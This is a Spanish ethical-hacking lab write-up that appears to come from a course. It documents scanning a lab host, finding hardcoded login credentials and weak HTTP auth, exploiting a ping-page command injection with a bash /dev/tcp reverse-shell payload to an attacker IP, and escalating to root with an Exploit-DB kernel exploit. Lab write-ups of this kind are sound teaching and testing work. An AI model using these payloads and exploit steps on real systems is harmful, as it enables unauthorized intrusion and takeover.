## Análisis automatizado
Se utiliza el escáner automático del proxy ZAP para identificar posibles vulnerabilidades.
### Vulnerabilidades encontradas por ZAP
#### Riesgo medio
- **Ausencia de tokens anti CSRF**
	Se confirma la vulnerabilidad analizando mediante el proxy Burpsuite las respuestas HTTP del servidor
- **Ausencia de Header CSP**
- **Ausencia de Header anti-clickjacking**
```sh
GET / HTTP/1.1
Host: 192.168.1.163
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
## Efectivamente, los headers/tokens flageados por ZAP están ausentes
```

- **Autenticación débil**
	En http://192.168.1.163/login_2/, ZAP reporta una vulnerabilidad de autenticación débil, se confirma visitando la URL, vemos que se nos intenta autenticar mediante HTTPAuth, método inseguro.+

![[http_auth.png]]

#### Riesgo leve
- **Leak de información en el Header "Server"**

<div class="page-break" style="page-break-before: always;"></div>

## Reconocimiento
En primer lugar, haciendo uso de `netdiscover` se averigua la IP objetivo de esta parte del ejercicio.

![[netdiscover.png]]

La IP es 192.168.1.163.
```
192.168.1.163
```

A continuación, se hace un reconocimiento de puertos y servicios con Nmap:
```sh
nmap --top-ports 10000 -sT -A -T5 -Pn 192.168.1.163 -oX nmapScan2.xml && xsltproc nmapScan2.xml -o nmapScan2.html
```

![[CS/Ciberseguridad/Writeups/26.1_enero/1_Hacking_Etico_Final/(imgs)/nmap.png]]

Posteriormente, se fuzzea con la herramienta `ffuf` en busca de archivos y/o directorios.

```c
ffuf -u "http://192.168.1.163/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -ic -c -r -t 100 -of html -o 1_fuzzing.html -e .php,.html,.db,.conf,.config,.txt,.js,.py,.bak,.conf,.env,.xml,.zip,.rar,.jpg,.jpeg,.png,.db,.sql,.log,.json
```

Se analizan los resultados y se añaden a la lista de endpoints que testear en busca de vulnerabilidades.

![[ffuf_results.png]]

No se encuentra nada en los directorios/archivos descubiertos que no se supiese previamente, más que flags.

<div class="page-break" style="page-break-before: always;"></div>

## Vulnerabilidades encontradas
### Leak en el código fuente en http://192.168.1.163/login_1/
Al visitar `/login_1` se observa un panel de login sencillo, probar credenciales por defecto básicas no funciona. Se examina el código fuente en busca de algún comentario que pueda revelar información, pero se encuentra algo mejor.

```html
<script>
function funcion_login(){
if (document.form.password.value=='supersecret' && document.form.login.value=='admin'){
document.form.submit();
}
else{ alert("Usuario y/o contraseña incorrectos"); } }
</script>
```

La autenticación es "de pega", es decir, no enfrenta las credenciales a ninguna base de datos, simplemente comprueba si son las credenciales almacenadas en el propio código en texto plano y autentica al usuario si coinciden con dichas cadenas de texto.
Gracias a este hallazgo, simplemente debemos poner las credenciales `admin:supersecret` y podremos acceder. Vemos que al autenticarnos correctamente se nos da una flag.


### Autentación débil en http://192.168.1.163/login_2/
Al acceder a `/login_2` se nos pide autenticar mediante HTTP auth, esto ya es de por sí vulnerable, ya que analizando con Burp la respuesta del servidor vemos que las credenciales viajan codificadas en Base64 (sin encriptar)

```sh
GET /login_2/ HTTP/1.1
Host: 192.168.1.163
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Authorization: Basic cXdlcXdlOnF3ZXdxZQ==
```

Basta con decodificar el string al final del todo para ver las credenciales

```sh
~/Desktop/labs/Saica/info ❯ echo 'cXdlcXdlOnF3ZXdxZQ==' | base64 -d         
qweqwe:qwewqe ## Output decodificado
```


### Command injection en http://192.168.1.163/ping/
Al visitar la página se ve una web sencilla con tres enlaces, el tercero de ellos consiste en una especie de "juego", pone textualmente:

```
Hola! Estamos desarrollando un sistema que realiza ping a la IP que se introduce vía parámetro, es bastante inestable y no funciona bien, pero estamos seguros que es 100% seguro, para probarlo basta con enviar por GET el parámetro IP, ej: index.php?ip=127.0.0.1
```

Al añadir un parámetro como el indicado en la solicitud, el `stdout` de un comando ping se renderiza en la web, resultando obvio que se está ejecutando el comando ping con el valor que se pasa a través del parámetro `ip`. 

![[ping_1.png]]

![[ping_2.png]]

Evidentemente, esta funcionalidad tiene todas las papeletas de ser vulnerable a command injection, se prueba a ejecutar otro comando tras el ping y efectivamente, lo es.

![[ping_3.png]]

Con este hallazgo ya se podría ganar perfectamente una revshell solicitando la siguiente URL

```
http://192.168.1.163/ping/index.php?ip=1;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.157%2F777%200%3E%261%27
```

El payload sin URL encodear es este: 
`bash -c 'bash -i >& /dev/tcp/192.168.1.157/777 0>&1'`

Previamente ya estaba en escucha en una terminal con `penelope -p 777`, ahora ya tengo una shell interactiva en la máquina objetivo como el usuario `www-data`.

<div class="page-break" style="page-break-before: always;"></div>

# Parte 2.1: Escalada
En primer lugar, colorizo la shell

![[color_tty.png]]

En primer lugar se obtiene información sobre la versión del OS y kernel.

![[kernel.png]]

Con una búsqueda rápida en Internet, vemos que hay varias vulnerabilidades que permiten LPE (Local Privilege Escalation). 

Se descarga el exploit escogido ([enlace](https://www.exploit-db.com/exploits/45010)), que abusa [CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995) y se descarga en la máquina atacante.

```sh
~/lab/Saica/exploits ❯ curl -o exploit https://www.exploit-db.com/exploits/45010
```

Se compila a vía `gcc` y se levanta un servidor HTTP con python para pasar el archivo a la máquina objetivo.

```sh
~/lab/Saica/exploits ❯ gcc exploit.c -o exploit

~/lab/Saica/exploits ❯ python3 -m http.server 333
```

En la consola que tenemos en la máquina objetivo, se descarga con `wget`, se le dan permisos de ejecución y se lanza. Al probar el exploit, da un error:

```
./exploit: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./exploit)
```

Para solventar el problema, compilaremos el exploit en un contenedor de Docker de la misma versión de Ubuntu que la máquina víctima.

```sh
~/lab/Saica/exploits ❯ docker pull ubuntu:16.04 ## Descargar la imagen
~/lab/Saica/exploits ❯ docker images ## Listar imágenes
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       16.04     b6f507652425   4 years ago   135MB

~/lab/Saica/exploits ❯ docker run -it b6f507652425 ## Lanzar el contenedor con shell interactiva
```

```
root@c870b4b5c7e2:/# ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu11.3) 2.23
--snip--
```

Se instala cURL con `apt install curl` y `gcc` (después de haber hecho `apt-update`), se descarga el exploit de nuevo y se vuelve a compilar. Luego se copia al host con `docker cp c870b4b5c7e2:/home/exploit .`.

De nuevo se repite el proceso, levantar server HTTP con python para servir el exploit, descargarlo desde la víctima y ejecutarlo (tras haberle dado permisos), esta vez, no hay fallo.

![[CS/Ciberseguridad/Writeups/26.1_enero/1_Hacking_Etico_Final/(imgs)/root.png]]

<div class="page-break" style="page-break-before: always;"></div>

# Parte 2.2: Servicios en ejecución
Ya como usuario root, se ejecuta el comando `ps aux`, para ver que más servicios hay en ejecución. Para que sea más fácil a la vista, se eliminan los campus que no aportan información valiosa de la lista copiada de procesos con `awk`, luego se hace una tabla para mas legibilidad:

```sh
~/lab/Saica/info/loot ❯ awk '{print $1 "\t\t" $2 "\t\t" $11 $12}' pss > formatted_pss
~/lab/Saica/info/loot ❯ awk '{print "|" $1 "|" $2 "|" $3 $4 "|"}' formatted_pss > table_pss
```

| USER     | PID       | COMMAND                                                   |
| -------- | --------- | --------------------------------------------------------- |
| **root** | **1**     | **/sbin/init**                                            |
| **root** | **298**   | **/lib/systemd/systemd-journald**                         |
| **root** | **354**   | **/lib/systemd/systemd-udevd**                            |
| systemd+ | 417       | /lib/systemd/systemd-timesyncd                            |
| **root** | **611**   | **/lib/systemd/systemd-logind**                           |
| **root** | **618**   | **/usr/sbin/cron-f**                                      |
| syslog   | 619       | /usr/sbin/rsyslogd-n                                      |
| message+ | 620       | /usr/bin/dbus-daemon--system                              |
| **root** | **643**   | **/usr/lib/accountsservice/accounts-daemon**              |
| **root** | **689**   | **/sbin/agetty--noclear**                                 |
| **root** | **760**   | **/sbin/dhclient-1**                                      |
| **root** | **796**   | **/usr/sbin/sshd-D**                                      |
| **root** | **804**   | **/usr/sbin/vsftpd/etc/vsftpd.conf**                      |
| mysql    | 835       | /usr/sbin/mysqld                                          |
| **root** | **842**   | **/usr/sbin/CRON-f**                                      |
| **root** | **849**   | **/bin/sh-c**                                             |
| **root** | **850**   | **/bin/sh/opt/james-2.3.2.1/bin/run.sh**                  |
| **root** | **856**   | **/usr/lib/jvm/default-java/bin/java-Djava.ext.dirs=/op** |
| **root** | **896**   | **/usr/sbin/apache2-k**                                   |
| www-data | 918       | /usr/sbin/apache2-k                                       |
| www-data | 919       | /usr/sbin/apache2-k                                       |
| www-data | 920       | /usr/sbin/apache2-k                                       |
| www-data | 921       | /usr/sbin/apache2-k                                       |
| www-data | 922       | /usr/sbin/apache2-k                                       |
| **root** | **928**   | **php-fpm:master**                                        |
| www-data | 930       | php-fpm:pool                                              |
| www-data | 931       | php-fpm:pool                                              |
| www-data | 1187      | sh-c                                                      |
| www-data | 1189      | bash-c                                                    |
| www-data | 1190      | /bin/bash                                                 |
| www-data | 1220      | /usr/bin/python3-Wignore                                  |
| www-data | 1221      | /usr/sbin/apache2-k                                       |
| www-data | 1222      | /bin/bash-i                                               |
| www-data | 6762      | /usr/sbin/apache2-k                                       |
| **root** | **10252** | **/bin/sh**                                               |
| **root** | **10505** | **psaux**                                                 |

Se cortan los procesos entre brackets ([]), de la lista, ya que son procesos del kernel y otros servicios del sistema, no van a revelar información importante. Luego se resaltan en negrita todos los procesos asociados a root.

<div class="page-break" style="page-break-before: always;"></div>

## Análisis
### init
Comenzando desde el principio, `init`, según el manual de `systemd`, init es el primer proceso que se ejecuta tras el boot (PID 1) y es el responsable de iniciar y mantener el espacio de usuario, es decir, de haber varios usuarios, habría varios inits corriendo en el mismo kernel.

### systemd
El resto de procesos que forman parte de `systemd` son también procesos internos del sistema, como registro de eventos (`journald`) o gestión de dispositivos(`udevd`), entre otros.

### cron-f
Este proceso es el daemon de cron, que está pendiente de ejecutar los archivos programados para lanzarse de forma periódica o programada.

### rsyslogd
Es una utilidad del sistema que proporciona logging de mensajes.

### dbus-daemon--sytem
Se trata de un daemon que queda pendiente de gestionar eventos relacionados el sistema de mensajes bus, que tramita comunicaciones 1 a 1 entre aplicaciones del sistema y otros eventos como nuevos dispositivos.

### accounts-daemon
Es un proceso que permite a programas consumir y manipular información de la cuenta de usuario a través de un D-Bus

### agetty--noclear
Proceso invocado por `init` que abre un puerto tty, pide información de login e invoca el comando `/bin/login`

### dhclient-1
Cliente para gestionar solicitudes/respuestas DHCP (Dynamic Host Configuration Protocol), es decir, pide una IP al servidor DHCP y gestiona la resolución de la respuesta.

### sshd-D
sshd es un daemon de OpenSSH que esta a la escucha de de comunicaciones vía SSH, crea "copias" de sí mismo con la system call `fork()` cada vez que inicia una conexión y gestiona el intercambio de llaves, cifrado, autenticación, ejecución de comandos y transferencia de información.

### vsftpd.conf
vsftpd es un servidor FTP para sistemas Unix, este proceso controla varios aspectos del comportamiento de dicho servidor. Esto verifica la información ya conocida sobre el servidor FTP presente en la máquina

### mysqld
Este proceso controla y gestiona lo relacionado al comportamiento, lectura y escritura de las bases de datos MySQL, escucha solicitudes de red de los clientes y accede a las bases de datos en nombre de ellos. Esto confirma la presencia de una DB MySQL en este sistema.

### sh-c
Simplemente es un comando pasado a `sh` como parámetro con la flag `-c`. Hay otros iguales en los PIDs 1187 y 10252, y el PID 1189, 1190 y 1222: `bash -c` es algo similar, solo que con `bash` en lugar de `sh`.

### james (run.sh)
Este proceso referencia la ruta absoluta del script encargado de levantar el servidor Jamer (Java Apache Mail Enterprise Server), es decir, un servidor de mailing (cuya versión, por cierto, es vulnerable).

### Java
James corre en java, así que este proceso muy probablemente se trate del compilador o algún otro proceso similar complementario a James.

### apache2-k
Es simple y llanamente un worker de Apache, la flag `-k` es para iniciar el proceso, y hay tantos de ellas por que se llama `fork()` en función de la cantidad de demanda de potencia de cómputo que hay en la página web. Además de todos los que están juntos hay dos mas en los PID 1221 y 6762.

### php-fpm
FastCGI Process Manager. Un FastCGI es, por así decirlo, un intermediario entre el servidor web y el programa CGI, se genera un proceso por cada request para gestionar el tránsito de información entre dichos programas con el servidor web.

### python3-Wignore
Este proceso esta corriedno el interpreter de python, y la flag `-W ignore` hace que el comando ignore todas las advertencias

### ps aux
El último proceso, de PID 10505, no es más que el propio comando que ha generado el output que está analizando. `ps` es una utilidad que muestra los procesos, su PID, dueño, recursos consumidos...

<div class="page-break" style="page-break-before: always;"></div>

# Herramientas usadas
- Google (con operadores de búsqueda)
- Bing
- Shodan
- ping
- [`nmapper.sh`](https://github.com/galizaragoza/sec_tools/blob/main/nmapper.sh)
- NMap
- DuckDuckGo
- [`CVE_table_maker.sh`](https://github.com/galizaragoza/sec_tools/blob/main/CVE_table_maker.sh)
- cURL
- FFUF
- Penelope Shell Manager
- Metasploit Framework
- OWASP ZAP Proxy
- man
- Burpsuite
- ExploitDB

 <div class="page-break" style="page-break-before: always;"></div>

# Fuentes
- https://www.adasasystems.com/es/caso-de-estudio/red-de-alerta-de-calidad-de-aguas-saica-ebro.html?file=files/adasa/images/case-studies/saica-ebro-water-quality-monitoring-network/Case_Study_SAICA_Ebro_ES.pdf&cid=5705
- https://morapackaging.com/wp-content/uploads/2024/08/Certificado-RESIDUO-ZERO-2024_CARTONAJES-MORA.pdf
- https://www.ecoembes.com/sites/default/files/inline-files/recicladores/municipal/Listado_RR_homologados_Resto_de_materiales.pdf
- https://www.miteco.gob.es/content/dam/miteco/es/agua/formacion/4_SAICA_Tesesa_Sancho_tcm30-214827.pdf
- https://zaguan.unizar.es/record/111150/files/TAZ-TFG-2022-330.pdf
- https://www.stratesys-ts.com/wp-content/uploads/2014/07/Presentaci%C3%B3n-SAICA-STRATESYS-Forum-Ausape.pdf
- https://www.sealpath.com/wp-content/uploads/2023/10/caso-de-exito-saica-sealpath_esp.pdf
- https://alcampocorporativo.es/wp-content/uploads/NdP_Auchan_Saica.pdf
- https://www.boa.aragon.es/cgi-bin/EBOA/BRSCGI?CMD=VEROBJ&MLKOB=1398756141111
- https://ugtsaica.es/wp-content/uploads/2024/02/NOMINAS-SAICA-NON-STOP.pdf
- https://www.comunidad.madrid/transparencia/sites/default/files/regulation/documents/mtd_aai_jul_2021.pdf
- https://www.chebro.es/documents/20121/79280/2015_episodios_906.pdf/a95007e0-ef9e-33e7-c462-f706c2cf901d
- https://graficas.fsc.ccoo.es/57961c0881133ac0dd1ff75e3fd8da98000050.pdf
- https://www.ccoo.cat/pdf_documents/InfoSaica[1].pdf
- https://ugtsaica.es/wp-content/uploads/2021/04/20210412-Comunicado-Coordinadora-Estatal-Ugt-Grupo-Saica.pdf
- https://www.boa.aragon.es/cgi-bin/EBOA/BRSCGI?CMD=VEROBJ&MLKOB=1306127620202- 
- https://www.checkpoint.com/quantum/unified-cyber-security-platform/smart-1-appliances/#models
- https://sc1.checkpoint.com/documents/R81/WebAdminGuides/EN/CP_R81_Multi-DomainSecurityManagement_AdminGuide/Topics-MDSG/Environment-Variables.htm
- https://en.wikipedia.org/wiki/Apache_Subversion
- https://www.f5.com/products/load-balancing#deployment
- https://www.f5.com/products/big-ip-services/big-ip-dns#introduction
- https://en.wikipedia.org/wiki/Node-RED
- https://nodered.org/docs/
- https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/version_id-973969/F5-Nginx-1.14.0.html
- https://github.com/apache/kyuubi/blob/master/kyuubi-server/web-ui/README.md
- https://github.com/apache/kyuubi/tree/master
- https://en.wikipedia.org/wiki/Xinu
- https://www.cvedetails.com/vulnerability-list/vendor_id-315/product_id-101578/version_id-973969/F5-Nginx-1.14.0.html
- https://www.cvedetails.com/version/612957/Apache-Http-Server-2.4.37.html
- https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/expressway/release_note/X14-2-5/Expressway/exwy_b_cisco-expressway-release-note-x1425.html
- https://es.wikipedia.org/wiki/Protocolo_de_iniciaci%C3%B3n_de_sesi%C3%B3n
- https://www.cisco.com/c/dam/en/us/td/docs/telepresence/endpoint/ex-series/tc3/administrator_guide/tandberg_ex90_administrator_guide_tc31.pdf
- https://www.cvedetails.com/vulnerability-list/vendor_id-16/product_id-35371/version_id-1762946/Cisco-Expressway-X14.2.5.html?page=1&order=3
- https://en.wikipedia.org/wiki/Tandberg#Products
- https://www.securityspace.com/es/smysecure/daudit_ports.html
- https://forums.vitalpbx.org/t/autoprovision-is-using-port-5062-vitalpbx-is-listening-on-5060/483
- https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/expressway/config_guide/X14-0/basic_config/exwy_b_cisco-expressway-e-and-expressway-c-basic-configuration-deployment-guide-x14-0/exwy_m_introduction.html
- https://www.cisco.com/c/en/us/td/docs/voice_ip_comm/expressway/config_guide/X14-0/basic_config/exwy_b_cisco-expressway-e-and-expressway-c-basic-configuration-deployment-guide-x14-0/exwy_m_introduction.html
- https://unix.stackexchange.com/questions/22121/what-do-the-brackets-around-processes-mean
- https://linux.die.net/man/8/udevd
- https://www.freedesktop.org/software/systemd/man/latest/systemd-journald.service.html
- https://man7.org/linux/man-pages/man8/rsyslogd.8.html
- https://www.ibm.com/docs/en/aix/7.3.0?topic=c-cron-daemon
- https://www.freedesktop.org/wiki/Software/dbus/
- https://man7.org/linux/man-pages/man8/agetty.8.html
- man sshd
- https://security.appspot.com/vsftpd.html
- https://linux.die.net/man/5/vsftpd.conf